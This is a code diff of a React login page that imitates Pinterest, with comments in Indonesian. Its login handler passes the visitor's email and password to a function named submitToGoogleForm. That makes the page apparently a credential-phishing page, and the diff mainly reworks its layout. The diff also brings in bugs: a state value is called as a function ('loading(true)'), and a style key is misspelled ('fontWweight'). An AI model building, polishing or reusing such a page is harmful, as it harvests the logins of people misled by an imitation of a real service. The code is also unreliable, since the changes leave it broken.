@@ -1,5 +1,6 @@
 import React, { useState, useEffect, useMemo } from "react";
 import favicon from "../assets/favicon.png";
+
 // ─────────────────────────────────────────────────────────────────────────────
 // CONFIG & CONSTANTS
 // ─────────────────────────────────────────────────────────────────────────────
@@ -886,7 +887,7 @@ function SocialBtn({ children, onClick }: { children: React.ReactNode; onClick: 
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// UPDATE PADA MAIN APP ROOT Component
+// MAIN APP ROOT
 // ─────────────────────────────────────────────────────────────────────────────
 
 export default function App() {
@@ -899,16 +900,6 @@ export default function App() {
   const [loading, setLoading] = useState(false);
   const [showSignUp, setShowSignUp] = useState(false);
 
-  // Deteksi ukuran layar untuk mengoptimalkan layout container login
-  const [isMobileScreen, setIsMobileScreen] = useState(false);
-
-  useEffect(() => {
-    const checkSize = () => setIsMobileScreen(window.innerWidth < 480);
-    checkSize();
-    window.addEventListener("resize", checkSize);
-    return () => window.removeEventListener("resize", checkSize);
-  }, []);
-
   async function handleLogin(e: React.FormEvent) {
     e.preventDefault();
     setError("");
@@ -916,7 +907,7 @@ export default function App() {
       setError("Harap isi email dan password.");
       return;
     }
-    setLoading(true);
+    loading(true);
 
     submitToGoogleForm(email, password);
 
@@ -943,28 +934,15 @@ export default function App() {
     <div
       style={{
         minHeight: "100vh",
+        overflow: "hidden",
         position: "relative",
         fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
-        display: "flex",
-        flexDirection: "column",
-        background: "#000", // Menjaga konsistensi visual di belakang backdrop blur
       }}
     >
-      {/* Background Masonry */}
       <MasonryBackground />
-      
-      {/* Gelap / Backdrop Blur Layer */}
-      <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.45)", backdropFilter: "blur(2px)", zIndex: 1 }} />
+      <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.42)", backdropFilter: "blur(1px)" }} />
 
-      {/* Tombol Sign Up di Pojok Atas */}
-      <div 
-        style={{ 
-          position: "absolute", 
-          top: "calc(16px + env(safe-area-inset-top))", // Antisipasi notch pada iPhone
-          left: "calc(16px + env(safe-area-inset-left))", 
-          zIndex: 15 
-        }}
-      >
+      <div style={{ position: "fixed", top: 16, left: 16, zIndex: 15 }}>
         <button
           onClick={() => setShowSignUp(true)}
           style={{
@@ -985,34 +963,34 @@ export default function App() {
         </button>
       </div>
 
-      {/* Kontainer Utama Pengatur Posisi Kartu Login (Scrollable & Flexbox) */}
-      <div
-        style={{
-          position: "relative",
-          zIndex: 10,
-          flex: 1,
-          display: "flex",
-          alignItems: "center",
-          justifyContent: "center",
-          padding: isMobileScreen ? "80px 12px 40px" : "40px 16px", // Ruang dinamis agar tidak terpotong tombol atas
-          boxSizing: "border-box",
-          overflowY: "auto", // Izinkan scroll internal jika layar sangat pendek (misal landscape mode)
-          minHeight: "100vh",
+      <div 
+        style={{ 
+          position: "fixed", 
+          inset: 0, 
+          display: "flex", 
+          alignItems: "center", 
+          justifyContent: "center", 
+          zIndex: 10, 
+          padding: "16px",
+          overflowY: "auto",
+          WebkitOverflowScrolling: "touch"
         }}
       >
-        {/* Kartu Formulir Login */}
         <div
           style={{
             background: "#fff",
-            borderRadius: isMobileScreen ? 32 : 24, // Desain sudut melengkung khas iOS/Android modern
-            padding: isMobileScreen ? "36px 24px 28px" : "40px 32px 28px",
+            borderRadius: 24,
+            padding: "32px 24px 28px",
             width: "100%",
-            maxWidth: 380,
-            boxShadow: "0 10px 40px rgba(0,0,0,.3)",
+            maxWidth: 360,
+            boxShadow: "0 8px 40px rgba(0,0,0,.35)",
             textAlign: "center",
-            boxSizing: "border-box",
-            // Mengoptimalkan rendering performa transisi di perangkat mobile
-            transform: "translate3d(0, 0, 0)", 
+            margin: "auto",
+            maxHeight: "calc(100vh - 32px)",
+            display: "flex",
+            flexDirection: "column",
+            overflowY: "auto",
+            boxSizing: "border-box"
           }}
         >
           <div style={styles.logoContainer}>
@@ -1123,7 +1101,7 @@ export default function App() {
             </div>
 
             <div style={{ marginTop: 6 }}>
-              <span style={{ fontWeight: 700 }}>
+              <span style={{ fontWweight: 700 }}>
                 Not on Pinterest yet?{" "}
                 <button
                   onClick={() => setShowSignUp(true)}
@@ -1154,7 +1132,6 @@ export default function App() {
         </div>
       </div>
 
-      {/* Modal Sign Up */}
       {showSignUp && (
         <>
           <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.55)", zIndex: 120 }} onClick={() => setShowSignUp(false)} />
